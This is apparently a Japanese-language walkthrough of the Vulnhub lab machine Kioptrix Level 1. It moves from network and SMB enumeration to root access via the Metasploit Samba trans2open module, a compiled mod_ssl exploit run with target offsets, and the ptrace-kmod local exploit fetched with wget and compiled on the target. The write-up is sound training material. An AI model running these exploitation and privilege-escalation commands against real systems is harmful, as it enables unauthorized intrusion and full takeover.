## 1. Target Information（対象情報）
Machine : Linux

Platform : Vulnhub

Difficulty : Easy

Target IP : 192.168.56.4

Goal : root権限の取得

## 2. Reconnaissance（事前調査）
対象マシンのIPアドレスを特定
```bash
netdiscover -r 192.168.56.0/24
```
![HTTP request]({{ '/assets/images/writeups/kioptrix1/netdiscover.png' | relative_url }})

## 3. Enumeration（列挙）

### 3.1 Port Scanning
公開されているポートとサービスの確認
```bash
nmap -Pn -sS -sV 192.168.56.4
```
![HTTP request]({{ '/assets/images/writeups/kioptrix1/nmap.png' | relative_url }})

### 3.2 Directory Enumeration
ディレクトリ・サブドメイン探索の探索
```bash
gobuster dir -u http://192.168.56.4 -w /usr/share/wordlists/dirb/common.txt
```

### 3.3 Web Vulnerability Scanning
既知の脆弱性を調査
```bash
nikto -h http://192.168.56.4
```
![HTTP request]({{ '/assets/images/writeups/kioptrix1/nikto.png' | relative_url }})

### 3.4 SMB Enumeration
SMBのバージョンを把握していないため、調査

Nmapによるバージョン調査
```bash
nmap -p139 -sV --version-all 192.168.56.4
```
![HTTP request]({{ '/assets/images/writeups/kioptrix1/nmap_version.png' | relative_url }})

enum4linuxによるバージョン調査
```bash
enum4linux -a 192.168.56.4 | grep -iE "samba|version|server|os"
```
![HTTP request]({{ '/assets/images/writeups/kioptrix1/enum4linux.png' | relative_url }})

MetasploitによるSMBバージョン調査
```bash
msfconsole
msf6 > search smb_version
msf6 > use 0
msf6 auxiliary(scanner/smb/smb_version) > show options
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.56.4
msf6 auxiliary(scanner/smb/smb_version) > exploit
```
![HTTP request]({{ '/assets/images/writeups/kioptrix1/msf_smb_version.png' | relative_url }})

以上によるバージョンの特定は出来なかった。
なのでwiresharkで通信を傍受してパケットの確認
```bash
smbclient -L 192.168.56.4 -p 139
```
![HTTP request]({{ '/assets/images/writeups/kioptrix1/wireshark.png' | relative_url }})

## 5. Exploitation（攻撃・侵入）

### 5.1 samba 2.2
取得したExploitのコンパイル
```bash
gcc 10.c -o RCE
```
古くコンパイルの失敗
![HTTP request]({{ '/assets/images/writeups/kioptrix1/smb_compile_f.png' | relative_url }})

Metasploit Frameworkを使用してSamba 2.2系のExploitの検索から実施
```bash
msfconsole 
search samba 2.2
use 2
set payload 29
set RHOSTS 192.168.56.4
set LHOST 192.168.56.3
exploit
```
![HTTP request]({{ '/assets/images/writeups/kioptrix1/trans2open.png' | relative_url }})

侵入後権限の確認
```bash
whoami
root
```
![HTTP request]({{ '/assets/images/writeups/kioptrix1/trans2open_exploit.png' | relative_url }})

### 5.2 mod_ssl 2.8.4
取得したExploitのコンパイルとターゲットの確認
```bash
gcc -o 47080 47080.c -lcrypto
./47080
```
![HTTP request]({{ '/assets/images/writeups/kioptrix1/apache_target.png' | relative_url }})

0x6aでは失敗
```bash
./47080 0x6a 192.168.56.4
```
![HTTP request]({{ '/assets/images/writeups/kioptrix1/0x6a_f.png' | relative_url }})

0x6bで成功
```bash
./47080 0x6b 192.168.56.4
```
![HTTP request]({{ '/assets/images/writeups/kioptrix1/0x6b_t.png' | relative_url }})

対象マシンがインターネットに接続していないためhttpを建てる
```bash
wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
python3 -m http.server 8000
```
ダウンロードして実行し、root確認
```bash
wget http://192.168.56.3:8000/ptrace-kmod.c
gcc -o fuck ptrace-kmod.c
./fuck
```
![HTTP request]({{ '/assets/images/writeups/kioptrix1/ptrace_local.png' | relative_url }})
